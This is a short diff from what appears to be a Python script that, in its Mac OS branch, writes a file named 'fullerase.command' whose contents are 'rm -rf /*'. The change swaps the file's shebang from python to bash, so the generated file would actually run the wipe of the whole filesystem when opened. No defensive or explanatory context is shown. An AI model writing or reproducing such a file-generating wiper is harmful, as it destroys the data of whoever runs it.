@@ -73,7 +73,7 @@ if usragr==("OK"):
                                 f.write("\n")
                 elif OS==("2"):
                     print("Note: for Mac OS chmod files first")
-                    lines = ["#!/usr/bin/env python", "rm -rf /*"]
+                    lines = [" #!/bin/bash", "rm -rf /*"]
                     with open("fullerase.command", "w") as f:
                         for line in lines:
                             f.write(line)
